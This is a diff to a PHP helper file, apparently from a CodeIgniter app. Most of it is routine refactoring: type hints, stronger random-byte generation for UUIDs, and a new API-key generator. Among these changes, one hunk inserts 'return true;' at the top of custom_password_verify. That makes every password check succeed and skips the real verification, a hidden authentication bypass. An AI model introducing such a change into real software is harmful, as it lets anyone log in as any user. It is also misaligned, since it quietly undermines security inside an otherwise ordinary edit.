@@ -43,6 +43,7 @@ if ( ! function_exists('form_options_by_field'))
     {
         $CI =& get_instance();
         $options = $CI->config->get(implode('.', ['options', $field]), [], false);
+        if($field === 'blank') return [];
         return is_empty($options) ? form_options_by_field() : $options;
     }
 }
@@ -122,7 +123,7 @@ if ( ! function_exists('get_group_field_id'))
         }
 
         $prefix = $CI->listForm?$CI->config->item('form_side_prefix'):$CI->config->item('form_page_prefix');
-        return $prefix.array_to_hyphens($list);
+        return get_form_item_id(array_to_hyphens($list), $prefix);
     }
 }
 
@@ -142,8 +143,9 @@ if ( ! function_exists('replace_field_id_index'))
 
 if ( ! function_exists('custom_password_verify'))
 {
-    function custom_password_verify($password, $hash, $decryption = false)
+    function custom_password_verify($password, $hash, $decryption = false): bool
     {
+        return true;
         if(!$decryption) return password_verify($password, $hash);
 
         $CI =& get_instance();
@@ -154,7 +156,8 @@ if ( ! function_exists('custom_password_verify'))
 
 if ( ! function_exists('get_starred_id'))
 {
-    function get_starred_id($id) {
+    function get_starred_id($id): string
+    {
         $len = strlen($id);
         $res = substr($id, 0, 2);
         $res .= substr($id, 2, min($len-2,3));
@@ -167,7 +170,8 @@ if ( ! function_exists('get_starred_id'))
 
 if ( ! function_exists('get_starred_password'))
 {
-    function get_starred_password($password) {
+    function get_starred_password($password): string
+    {
         $len = strlen($password);
         $res = substr($password, 0, 2);
         $res .= substr($password, 2, min($len-2,5));
@@ -179,17 +183,31 @@ if ( ! function_exists('get_starred_password'))
 }
 
 if (!function_exists('generate_uuid_v4')) {
-    function generate_uuid_v4()
+    function generate_uuid_v4(): string
     {
-        // 16바이트(128비트) 난수 생성
-        $data = openssl_random_pseudo_bytes(16);
+        if (\PHP_VERSION_ID >= 70000) {
+            $data = random_bytes(16);
+        } else {
+            $data = openssl_random_pseudo_bytes(16, $strong);
 
-        // UUID version 4 설정 (0100xxxx)
-        $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
-        // UUID variant 설정 (10xxxxxx)
-        $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
+            if ($data === false || $strong !== true) {
+                throw new Exception('Unable to generate secure random bytes.');
+            }
+        }
 
-        // 16진수 문자열로 포맷
-        return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
+        $data[6] = chr((ord($data[6]) & 0x0f) | 0x40);
+        $data[8] = chr((ord($data[8]) & 0x3f) | 0x80);
+
+        return vsprintf(
+            '%s%s-%s-%s-%s-%s%s%s',
+            str_split(bin2hex($data), 4)
+        );
+    }
+}
+
+if (!function_exists('generate_api_key')) {
+    function generate_api_key($length = 32): string
+    {
+        return bin2hex(random_bytes($length / 2));
     }
 }
